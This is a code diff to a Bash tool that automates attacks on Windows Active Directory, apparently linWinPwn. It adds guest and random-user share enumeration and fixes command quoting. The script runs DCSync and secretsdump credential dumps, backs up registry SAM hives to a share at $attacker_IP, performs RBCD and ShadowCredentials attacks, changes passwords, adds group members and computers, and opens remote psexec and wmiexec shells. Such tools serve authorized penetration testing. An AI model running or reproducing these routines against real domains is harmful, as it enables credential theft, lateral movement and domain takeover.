             if [[ $(grep "found vulnerable" ${output_dir}/Vulnerabilities/ms14-068_output_${dc_domain}.txt 2>/dev/null) ]]; then
                 echo -e "${GREEN}[+] Domain controller vulnerable to MS14-068 found (False positives possible on newer versions of Windows)!${NC}"
                 echo -e "${CYAN}# Execute command below to get shell:${NC}"
@@ -1972,7 +1969,12 @@ smb_map () {
             echo -e "${BLUE}[*] Listing accessible SMB shares - Step 1/2${NC}"
             for i in $(/bin/cat ${servers_smb_list} 2>/dev/null | grep -v ":"); do
                 echo -e "${CYAN}[*] Listing shares on ${i} ${NC}"
-                run_command "${smbmap} -H $i ${argument_smbmap}" | grep -v "Working on it..." 2>&1 > ${output_dir}/Shares/smbmapDump/smb_shares_${dc_domain}_${i}.txt 
+                run_command "${smbmap} -H $i ${argument_smbmap}" | grep -v "Working on it..." 2>&1 > ${output_dir}/Shares/smbmapDump/smb_shares_${dc_domain}_${i}.txt
+                if [ "${nullsess_bool}" == true ]; then
+                    echo -e "${CYAN}[*] smbmap enumeration (Guest and random user)${NC}"
+                    run_command "${smbmap} -H $i -u 'Guest' -p ''" | grep -v "Working on it..." 2>&1 >> ${output_dir}/Shares/smbmapDump/smb_shares_${dc_domain}_${i}.txt
+                    run_command "${smbmap} -H $i -u ${rand_user} p ''" | grep -v "Working on it..." 2>&1 >> ${output_dir}/Shares/smbmapDump/smb_shares_${dc_domain}_${i}.txt
+                fi
             done
 
             grep -iaH READ ${output_dir}/Shares/smbmapDump/smb_shares_${dc_domain}_*.txt 2>&1 | grep -v 'prnproc\$\|IPC\$\|print\$\|SYSVOL\|NETLOGON' | sed "s/\t/ /g; s/   */ /g; s/READ ONLY/READ-ONLY/g; s/READ, WRITE/READ-WRITE/g; s/smb_shares_//; s/.txt://g; s/${dc_domain}_//g" | rev | cut -d "/" -f 1 | rev | awk -F " " '{print $1 ";"  $2 ";" $3}' > ${output_dir}/Shares/all_network_shares_${dc_domain}.csv
@@ -1988,6 +1990,11 @@ smb_map () {
                     mkdir -p ${output_dir}/Shares/smbmapDump/${i}
                     cd ${output_dir}/Shares/smbmapDump/${i}
                     run_command "${smbmap} -H $i ${argument_smbmap} -A '\.cspkg|\.publishsettings|\.xml|\.json|\.ini|\.bat|\.log|\.pl|\.py|\.ps1|\.txt|\.config|\.conf|\.cnf|\.sql|\.yml|\.cmd|\.vbs|\.php|\.cs|\.inf' -r --exclude 'ADMIN$' 'C$' 'C' 'IPC$' 'print$' 'SYSVOL' 'NETLOGON' 'prnproc$'" | grep -v "Working on it..." 2>&1 > ${output_dir}/Shares/smbmapDump/smb_files_${dc_domain}_${i}.txt 
+                    if [ "${nullsess_bool}" == true ]; then
+                        echo -e "${CYAN}[*] smbmap enumeration (Guest and random user)${NC}"
+                        run_command "${smbmap} -H $i -u 'Guest' -p '' -A '\.cspkg|\.publishsettings|\.xml|\.json|\.ini|\.bat|\.log|\.pl|\.py|\.ps1|\.txt|\.config|\.conf|\.cnf|\.sql|\.yml|\.cmd|\.vbs|\.php|\.cs|\.inf' -r --exclude 'ADMIN$' 'C$' 'C' 'IPC$' 'print$' 'SYSVOL' 'NETLOGON' 'prnproc$'" | grep -v "Working on it..." 2>&1 >> ${output_dir}/Shares/smbmapDump/smb_files_${dc_domain}_${i}.txt
+                        run_command "${smbmap} -H $i -u ${rand_user} -p '' -A '\.cspkg|\.publishsettings|\.xml|\.json|\.ini|\.bat|\.log|\.pl|\.py|\.ps1|\.txt|\.config|\.conf|\.cnf|\.sql|\.yml|\.cmd|\.vbs|\.php|\.cs|\.inf' -r --exclude 'ADMIN$' 'C$' 'C' 'IPC$' 'print$' 'SYSVOL' 'NETLOGON' 'prnproc$'" | grep -v "Working on it..." 2>&1 >> ${output_dir}/Shares/smbmapDump/smb_files_${dc_domain}_${i}.txt
+                    fi
                     cd ${current_dir}
                 fi
             done
@@ -1997,24 +2004,35 @@ smb_map () {
 }
 
 ne_shares () {
-    echo -e "${BLUE}[*] Enumerating Shares using netexec ${NC}"
     if [ "${kerb_bool}" == true ]; then
         echo -e "${PURPLE}[-] Targeting DCs only${NC}"
         curr_targets="Domain Controllers"
     fi
+    echo -e "${BLUE}[*] Enumerating Shares using netexec ${NC}"
     smb_scan
     run_command "${netexec} ${ne_verbose} smb ${servers_smb_list} ${argument_ne} --shares --log ${output_dir}/Shares/ne_shares_output_${dc_domain}.txt" 2>&1
+    if [ "${nullsess_bool}" == true ]; then
+        echo -e "${BLUE}[*] Enumerating Shares using netexec (Guest and random user)${NC}"
+        run_command "${netexec} ${ne_verbose} smb ${servers_smb_list} -u Guest -p '' --shares --log ${output_dir}/Shares/ne_shares_nullsess_output_${dc_domain}.txt" 2>&1
+        run_command "${netexec} ${ne_verbose} smb ${servers_smb_list} -u ${rand_user} -p '' --shares --log ${output_dir}/Shares/ne_shares_nullsess_output_${dc_domain}.txt" 2>&1
+    fi
+
     echo -e ""
 }
 
 ne_spider () {
-    echo -e "${BLUE}[*] Spidering Shares using netexec ${NC}"
     if [ "${kerb_bool}" == true ]; then
         echo -e "${PURPLE}[-] Targeting DCs only${NC}"
         curr_targets="Domain Controllers"
     fi
+    echo -e "${BLUE}[*] Spidering Shares using netexec ${NC}"
     smb_scan
-    run_command "${netexec} ${ne_verbose} smb ${servers_smb_list} ${argument_ne} -M spider_plus -o OUTPUT=${output_dir}/Shares/ne_spider_plus EXCLUDE_DIR=prnproc$,IPC$,print$,SYSVOL,NETLOGON --log ${output_dir}/Shares/ne_spider_output${dc_domain}.txt" 2>&1
+    run_command "${netexec} ${ne_verbose} smb ${servers_smb_list} ${argument_ne} -M spider_plus -o OUTPUT=${output_dir}/Shares/ne_spider_plus EXCLUDE_DIR=prnproc$,IPC$,print$,SYSVOL,NETLOGON --log ${output_dir}/Shares/ne_spider_output_${dc_domain}.txt" 2>&1
+    if [ "${nullsess_bool}" == true ]; then
+        echo -e "${BLUE}[*] Spidering Shares using netexec (Guest and random user)${NC}"
+        run_command "${netexec} ${ne_verbose} smb ${servers_smb_list} -u Guest -p '' -M spider_plus -o OUTPUT=${output_dir}/Shares/ne_spider_plus EXCLUDE_DIR=prnproc$,IPC$,print$,SYSVOL,NETLOGON --log ${output_dir}/Shares/ne_spider_nullsess_output_${dc_domain}.txt" 2>&1
+        run_command "${netexec} ${ne_verbose} smb ${servers_smb_list} -u ${rand_user} -p '' -M spider_plus -o OUTPUT=${output_dir}/Shares/ne_spider_plus EXCLUDE_DIR=prnproc$,IPC$,print$,SYSVOL,NETLOGON --log ${output_dir}/Shares/ne_spider_nullsess_output_${dc_domain}.txt" 2>&1
+    fi
     echo -e ""
 }
 
@@ -2023,9 +2041,13 @@ finduncshar_scan () {
         echo -e "${RED}[-] Please verify the installation of FindUncommonShares${NC}"
     else
         echo -e "${BLUE}[*] Enumerating Shares using FindUncommonShares${NC}"
-        if [ "${ldaps_bool}" == true ]; then ldaps_param="--use-ldaps"; else ldaps_param=""; fi
-        if [ "${verbose_bool}" == true ]; then verbose_p0dalirius="-v --debug"; else verbose_p0dalirius=""; fi
-        run_command "${FindUncommonShares} ${argument_p0dalirius} ${verbose_p0dalirius} ${ldaps_param} --dc-ip ${dc_ip} --check-user-access --export-xlsx ${output_dir}/Shares/finduncshar_${dc_domain}.xlsx" 2>&1 | tee -a ${output_dir}/Shares/finduncshar_shares_output_${dc_domain}.txt
+        if [ "${nullsess_bool}" == true ] ; then
+            echo -e "${PURPLE}[-] FindUncommonShares requires credentials ${NC}"
+        else
+            if [ "${ldaps_bool}" == true ]; then ldaps_param="--use-ldaps"; else ldaps_param=""; fi
+            if [ "${verbose_bool}" == true ]; then verbose_p0dalirius="-v --debug"; else verbose_p0dalirius=""; fi
+            run_command "${FindUncommonShares} ${argument_p0dalirius} ${verbose_p0dalirius} ${ldaps_param} --dc-ip ${dc_ip} --check-user-access --export-xlsx ${output_dir}/Shares/finduncshar_${dc_domain}.xlsx" 2>&1 | tee -a ${output_dir}/Shares/finduncshar_shares_output_${dc_domain}.txt
+        fi
     fi
     echo -e ""
 }
@@ -2067,7 +2089,7 @@ smbclient_console () {
             read -p ">> " smbclient_target </dev/tty
         done
         echo -e "${BLUE}[*] Opening smbclient.py console on target: $smbclient_target ${NC}"
-        run_command "${impacket_smbclient} ${argument_imp}"@${smbclient_target} 2>&1 | tee -a ${output_dir}/Shares/impacket_smbclient_output.txt
+        run_command "${impacket_smbclient} ${argument_imp}\\@${smbclient_target}" 2>&1 | tee -a ${output_dir}/Shares/impacket_smbclient_output.txt
     fi
     echo -e ""
 }
@@ -2210,7 +2232,7 @@ rpcdump_check () {
         smb_scan
         for i in $(/bin/cat ${servers_smb_list}); do
             echo -e "${CYAN}[*] RPC Dump of ${i} ${NC}"
-            run_command "${impacket_rpcdump} ${argument_imp}@$i" 2>&1 > ${output_dir}/Vulnerabilities/RPCDump/impacket_rpcdump_output_${i}.txt
+            run_command "${impacket_rpcdump} ${argument_imp}\\@$i" 2>&1 > ${output_dir}/Vulnerabilities/RPCDump/impacket_rpcdump_output_${i}.txt
             inte_prot="MS-RPRN MS-PAR MS-EFSR MS-FSRVP MS-DFSNM MS-EVEN"
             for prot in $inte_prot; do
                 prot_grep=$(cat ${output_dir}/Vulnerabilities/RPCDump/impacket_rpcdump_output_${i}.txt 2>/dev/null | grep -a "$prot")
@@ -2251,7 +2273,7 @@ privexchange_check () {
         echo -e "${RED}[-] privexchange.py not found! Please verify the installation of privexchange${NC}"
     else
         if [ "${kerb_bool}" == true ] || [ "${aeskey_bool}" == true ] ; then
-            echo -e "${PURPLE}[-] privexchange does not support kerberos authenticaiton${NC}"
+            echo -e "${PURPLE}[-] privexchange does not support kerberos authentication${NC}"
         else
             echo -e "${BLUE}[*] Use Exchange Web Services to call PushSubscription API using privexchange. Please specify hostname of Exchange server:${NC}"
             if [ "${nullsess_bool}" == true ] ; then
@@ -2360,8 +2382,7 @@ change_pass () {
                 read -p ">> " pass_passchange </dev/tty
             done
             echo -e "${CYAN}[*] Changing password of ${target_passchange} to ${pass_passchange}${NC}"
-            echo "$(date +%Y-%m-%d\ %H:%M:%S); ${bloodyad} ${argument_bloodyad} ${ldaps_param} --host ${dc_ip} set password \"${target_passchange}\" \"${pass_passchange}\"" >> $command_log
-            ${bloodyad} ${argument_bloodyad} ${ldaps_param} --host ${dc_ip} set password "${target_passchange}" "${pass_passchange}" | tee -a ${output_dir}/Modification/bloodyAD/bloodyad_out_passchange_${dc_domain}.txt 
+            run_command "${bloodyad} ${argument_bloodyad} ${ldaps_param} --host ${dc_ip} set password ${target_passchange} ${pass_passchange}" 2>&1 | tee -a ${output_dir}/Modification/bloodyAD/bloodyad_out_passchange_${dc_domain}.txt 
        fi
     fi
     echo -e ""
@@ -2388,8 +2409,7 @@ add_group_member () {
             read -p ">> " user_groupmem </dev/tty
             if [ "${user_groupmem}" == "" ]; then user_groupmem="${user}"; fi
             echo -e "${CYAN}[*] Adding ${user_groupmem} to group ${target_groupmem}${NC}"
-            echo "$(date +%Y-%m-%d\ %H:%M:%S); ${bloodyad} ${argument_bloodyad} ${ldaps_param} --host ${dc_ip} add groupMember \"${target_groupmem}\" \"${user_groupmem}\"" >> $command_log
-            ${bloodyad} ${argument_bloodyad} ${ldaps_param} --host ${dc_ip} add groupMember "${target_groupmem}" "${user_groupmem}" | tee -a ${output_dir}/Modification/bloodyAD/bloodyad_out_groupmem_${dc_domain}.txt 
+            run_command "${bloodyad} ${argument_bloodyad} ${ldaps_param} --host ${dc_ip} add groupMember '${target_groupmem}' '${user_groupmem}'" 2>&1 | tee -a ${output_dir}/Modification/bloodyAD/bloodyad_out_groupmem_${dc_domain}.txt 
        fi
     fi
     echo -e ""
@@ -2411,8 +2431,7 @@ add_computer () {
             read -p ">> " pass_addcomp </dev/tty
             if [[ ${pass_addcomp} == "" ]]; then pass_addcomp="Summer3000_"; fi
             echo -e "${CYAN}[*] Creating computer ${host_addcomp} with password ${pass_addcomp}${NC}"
-            echo "$(date +%Y-%m-%d\ %H:%M:%S); ${bloodyad} ${argument_bloodyad} ${ldaps_param} --host ${dc_ip} add computer \"${host_addcomp}\" \"${pass_addcomp}\"" >> $command_log
-            ${bloodyad} ${argument_bloodyad} ${ldaps_param} --host ${dc_ip} add computer "${host_addcomp}" "${pass_addcomp}" | tee -a ${output_dir}/Modification/bloodyAD/bloodyad_out_addcomp_${dc_domain}.txt 
+            run_command "${bloodyad} ${argument_bloodyad} ${ldaps_param} --host ${dc_ip} add computer '${host_addcomp}' '${pass_addcomp}'" 2>&1 | tee -a ${output_dir}/Modification/bloodyAD/bloodyad_out_addcomp_${dc_domain}.txt 
        fi
     fi
     echo -e ""
@@ -2442,13 +2461,12 @@ rbcd_attack () {
                 read -p ">> " service_rbcd </dev/tty
             done
             echo -e "${CYAN}[*] Performing RBCD attack against ${target_rbcd} using account ${service_rbcd}${NC}"
-            echo "$(date +%Y-%m-%d\ %H:%M:%S); ${bloodyad} ${argument_bloodyad} ${ldaps_param} --host ${dc_ip} add rbcd \"${target_rbcd}$\" \"${service_rbcd}$\"" >> $command_log
-            ${bloodyad} ${argument_bloodyad} ${ldaps_param} --host ${dc_ip} add rbcd "${target_rbcd}$" "${service_rbcd}$" | tee -a ${output_dir}/Modification/bloodyAD/bloodyad_out_rbcd_${dc_domain}.txt 
+            run_command "${bloodyad} ${argument_bloodyad} ${ldaps_param} --host ${dc_ip} add rbcd '${target_rbcd}$' '${service_rbcd}'" 2>&1 | tee -a ${output_dir}/Modification/bloodyAD/bloodyad_out_rbcd_${dc_domain}.txt 
             if [[ $(grep "can now impersonate users" ${output_dir}/Modification/bloodyAD/bloodyad_out_rbcd_${dc_domain}.txt 2>/dev/null) ]]; then
                 echo -e "${GREEN}[+] RBCD Attack successful! Run command below to generate ticket${NC}"
                 echo -e "${impacket_getST} -spn 'cifs/${target_rbcd}.${domain}' -impersonate Administrator -dc-ip ${dc_ip} '${domain}/${service_rbcd}$:PASSWORD'"
                 echo -e "${CYAN}[!] Run command below to remove impersonation rights:${NC}"
-                echo -e "${bloodyad} ${argument_bloodyad} ${ldaps_param} --host ${dc_ip} remove rbcd '${target_rbcd}$' '${service_rbcd}$'"
+                echo -e "${bloodyad} ${argument_bloodyad} ${ldaps_param} --host ${dc_ip} remove rbcd '${target_rbcd}$' '${service_rbcd}'"
             fi
        fi
     fi
@@ -2472,8 +2490,7 @@ shadowcreds_attack () {
                 read -p ">> " target_shadowcreds </dev/tty
             done
             echo -e "${CYAN}[*] Performing ShadowCredentials attack against ${target_shadowcreds}${NC}"
-            echo "$(date +%Y-%m-%d\ %H:%M:%S); ${bloodyad} ${argument_bloodyad} ${ldaps_param} --host ${dc_ip} add shadowCredentials \"${target_shadowcreds}$\" --path ${output_dir}/Credentials/shadowcreds_${target_shadowcreds}" >> $command_log
-            ${bloodyad} ${argument_bloodyad} ${ldaps_param} --host ${dc_ip} add shadowCredentials "${target_shadowcreds}$" --path "${output_dir}/Credentials/shadowcreds_${target_shadowcreds}"| tee -a ${output_dir}/Modification/bloodyAD/bloodyad_out_shadowcreds_${dc_domain}.txt 
+            run_command "${bloodyad} ${argument_bloodyad} ${ldaps_param} --host ${dc_ip} add shadowCredentials '${target_shadowcreds}$' --path ${output_dir}/Credentials/shadowcreds_${target_shadowcreds}" 2>&1 | tee -a ${output_dir}/Modification/bloodyAD/bloodyad_out_shadowcreds_${dc_domain}.txt 
        fi
     fi
     echo -e ""
@@ -2575,7 +2592,7 @@ secrets_dump_dcsync () {
         if [ "${nullsess_bool}" == true ] ; then
             echo -e "${PURPLE}[-] DCSync requires credentials${NC}"
         else
-            run_command "${impacket_secretsdump} ${argument_imp}@${target} -just-dc" | tee ${output_dir}/Credentials/dcsync_${dc_domain}.txt
+            run_command "${impacket_secretsdump} ${argument_imp}\\@${target} -just-dc" | tee ${output_dir}/Credentials/dcsync_${dc_domain}.txt
         fi
     fi
     echo -e ""
@@ -2592,7 +2609,7 @@ secrets_dump () {
             smb_scan
             for i in $(/bin/cat ${servers_smb_list}); do
                 echo -e "${CYAN}[*] secretsdump of ${i} ${NC}"
-                run_command "${impacket_secretsdump} ${argument_imp}@${i} -dc-ip ${dc_ip}" | tee ${output_dir}/Credentials/secretsdump_${dc_domain}_${i}.txt
+                run_command "${impacket_secretsdump} ${argument_imp}\\@${i} -dc-ip ${dc_ip}" | tee ${output_dir}/Credentials/secretsdump_${dc_domain}_${i}.txt
             done
         fi
     fi
@@ -2615,7 +2632,7 @@ samsystem_dump () {
             for i in $(/bin/cat ${servers_smb_list}); do
                 echo -e "${CYAN}[*] reg save of ${i} ${NC}"
                 mkdir -p ${output_dir}/Credentials/SAMDump/${i}
-                run_command "${impacket_reg} ${argument_imp}@${i} -dc-ip ${dc_ip} backup -o \\\\$attacker_IP\\lwpshare\\SAMDump\\$i" | tee ${output_dir}/Credentials/SAMDump/regsave_${dc_domain}_${i}.txt
+                run_command "${impacket_reg} ${argument_imp}\\@${i} -dc-ip ${dc_ip} backup -o \\\\$attacker_IP\\lwpshare\\SAMDump\\$i" | tee ${output_dir}/Credentials/SAMDump/regsave_${dc_domain}_${i}.txt
             done
         fi
     fi
@@ -2773,7 +2790,7 @@ donpapi_dump () {
             cd ${output_dir}/Credentials
             for i in $(/bin/cat ${servers_smb_list}); do
                 echo -e "${CYAN}[*] DonPAPI dump of ${i} ${NC}"
-                run_command "${donpapi} ${argument_donpapi}@${i} -dc-ip ${dc_ip}" | tee ${output_dir}/Credentials/DonPAPI_${dc_domain}_${i}.txt   
+                run_command "${donpapi} ${argument_donpapi}\\@${i} -dc-ip ${dc_ip}" | tee ${output_dir}/Credentials/DonPAPI_${dc_domain}_${i}.txt   
             done
             cd ${current_dir}
         fi
@@ -2787,11 +2804,11 @@ hekatomb_dump () {
     else
         echo -e "${BLUE}[*] Dumping secrets using hekatomb${NC}"
         if [ "${nullsess_bool}" == true ] || [ "${kerb_bool}" == true ] || [ "${aeskey_bool}" == true ] ; then
-            echo -e "${PURPLE}[-] hekatomb requires credentials and does not support kerberos authenticaiton${NC}"
+            echo -e "${PURPLE}[-] hekatomb requires credentials and does not support kerberos authentication${NC}"
         else
             current_dir=$(pwd)
             cd ${output_dir}/Credentials
-            run_command "${hekatomb} ${argument_hekatomb}@${dc_ip} -dns ${dc_ip} -smb2 -csv" | tee ${output_dir}/Credentials/hekatomb_${dc_domain}.txt
+            run_command "${hekatomb} ${argument_hekatomb}\\@${dc_ip} -dns ${dc_ip} -smb2 -csv" | tee ${output_dir}/Credentials/hekatomb_${dc_domain}.txt
             cd ${current_dir} 
         fi
     fi
@@ -2803,8 +2820,12 @@ bitlocker_dump () {
         echo -e "${RED}[-] Please verify the installation of ExtractBitlockerKeys${NC}"
     else
         echo -e "${BLUE}[*] Extracting BitLocker keys using ExtractBitlockerKeys${NC}"
-        if [ "${verbose_bool}" == true ]; then verbose_p0dalirius="-v"; else verbose_p0dalirius=""; fi
-        run_command "${ExtractBitlockerKeys} ${argument_p0dalirius} ${ldaps_param} ${verbose_p0dalirius} --kdcHost ${dc_FQDN} --dc-ip ${dc_ip}" 2>&1 | tee ${output_dir}/Credentials/bitlockerdump_output_${dc_domain}.txt
+        if [ "${nullsess_bool}" == true ] ; then
+            echo -e "${PURPLE}[-] ExtractBitlockerKeys requires credentials ${NC}"
+        else
+            if [ "${verbose_bool}" == true ]; then verbose_p0dalirius="-v"; else verbose_p0dalirius=""; fi
+            run_command "${ExtractBitlockerKeys} ${argument_p0dalirius} ${ldaps_param} ${verbose_p0dalirius} --kdcHost ${dc_FQDN} --dc-ip ${dc_ip}" 2>&1 | tee ${output_dir}/Credentials/bitlockerdump_output_${dc_domain}.txt
+        fi
     fi
     echo -e ""
 }
@@ -2844,7 +2865,7 @@ get_hash (){
             if [ "${nullsess_bool}" == true ] ; then
                 echo -e "${PURPLE}[-] DCSync requires credentials${NC}"
             else
-                run_command "${impacket_secretsdump} ${argument_imp}@${target} -just-dc-user $(echo ${domain} | cut -d "." -f 1)/${gethash_user}" | tee ${output_dir}/Credentials/hash_${gethash_user}_${dc_domain}.txt
+                run_command "${impacket_secretsdump} ${argument_imp}\\@${target} -just-dc-user $(echo ${domain} | cut -d "." -f 1)/${gethash_user}" | tee ${output_dir}/Credentials/hash_${gethash_user}_${dc_domain}.txt
             fi
         else
              echo -e "${YELLOW}[i] Hash file of ${gethash_user} found, skipping... ${NC}"
@@ -2869,7 +2890,7 @@ smbexec_console () {
             read -p ">> " smbexec_target </dev/tty
         done
         echo -e "${BLUE}[*] Opening smbexec.py console on target: $smbexec_target ${NC}"
-        run_command "${impacket_smbexec} ${argument_imp}"@${smbexec_target} 2>&1 | tee -a ${output_dir}/CommandExec/impacket_smbexec_output.txt
+        run_command "${impacket_smbexec} ${argument_imp}\\@${smbexec_target}" 2>&1 | tee -a ${output_dir}/CommandExec/impacket_smbexec_output.txt
     fi
     echo -e ""
 }
@@ -2887,7 +2908,7 @@ wmiexec_console () {
             read -p ">> " wmiexec_target </dev/tty
         done
         echo -e "${BLUE}[*] Opening wmiexec.py console on target: $wmiexec_target ${NC}"
-        run_command "${impacket_wmiexec} ${argument_imp}"@${wmiexec_target} 2>&1 | tee -a ${output_dir}/CommandExec/impacket_wmiexec_output.txt
+        run_command "${impacket_wmiexec} ${argument_imp}\\@${wmiexec_target}" 2>&1 | tee -a ${output_dir}/CommandExec/impacket_wmiexec_output.txt
     fi
     echo -e ""
 }
@@ -2905,7 +2926,7 @@ psexec_console () {
             read -p ">> " psexec_target </dev/tty
         done
         echo -e "${BLUE}[*] Opening psexec.py console on target: $psexec_target ${NC}"
-        run_command "${impacket_psexec} ${argument_imp}"@${psexec_target} 2>&1 | tee -a ${output_dir}/CommandExec/impacket_psexec_output.txt
+        run_command "${impacket_psexec} ${argument_imp}\\@${psexec_target}" 2>&1 | tee -a ${output_dir}/CommandExec/impacket_psexec_output.txt
     fi
     echo -e ""
 }
@@ -4715,10 +4736,10 @@ main () {
     prepare
     print_info
     authenticate
-    sid_domain=$(/bin/cat ${output_dir}/DomainRecon/ne_sid_output_${dc_domain}.txt 2>/dev/null | grep "Domain SID" | head -n 1 | sed 's/[ ][ ]*/ /g' | cut -d " " -f 12)
+    sid_domain=$(/bin/cat ${output_dir}/DomainRecon/ne_sid_output_${dc_domain}.txt 2>/dev/null | grep -a "Domain SID" | head -n 1 | sed 's/[ ][ ]*/ /g' | cut -d " " -f 12)
     if [[ ${sid_domain} == "" ]]; then 
         run_command "${netexec} ldap ${target} ${argument_ne} --get-sid --log ${output_dir}/DomainRecon/ne_sid_output_${dc_domain}.txt" > /dev/null
-        sid_domain=$(/bin/cat ${output_dir}/DomainRecon/ne_sid_output_${dc_domain}.txt 2>/dev/null | grep "Domain SID" | head -n 1 | sed 's/[ ][ ]*/ /g' | cut -d " " -f 12)
+        sid_domain=$(/bin/cat ${output_dir}/DomainRecon/ne_sid_output_${dc_domain}.txt 2>/dev/null | grep -a "Domain SID" | head -n 1 | sed 's/[ ][ ]*/ /g' | cut -d " " -f 12)
     fi
     echo -e "${YELLOW}[i]${NC} SID of Domain: ${YELLOW}${sid_domain}${NC}"
     echo -e ""
